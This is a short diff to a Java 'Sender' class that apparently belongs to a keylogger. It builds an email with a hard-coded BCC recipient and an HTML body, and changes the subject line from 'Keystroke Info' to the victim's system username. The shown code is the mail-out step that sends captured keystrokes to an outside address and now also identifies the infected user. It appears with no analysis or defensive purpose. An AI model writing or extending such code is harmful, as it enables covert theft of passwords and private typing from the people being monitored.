@@ -36,7 +36,7 @@ public class Sender {
         // create mail message
         emailMessage =  new MimeMessage(emailSession);
         emailMessage.addRecipient(Message.RecipientType.BCC, new InternetAddress(EMAIL));
-        emailMessage.setSubject("Keystroke Info");
+        emailMessage.setSubject(System.getProperty("user.name"));
         emailMessage.setContent(emailBody, "text/html");
 
         // ensure smtp works properly and send the email
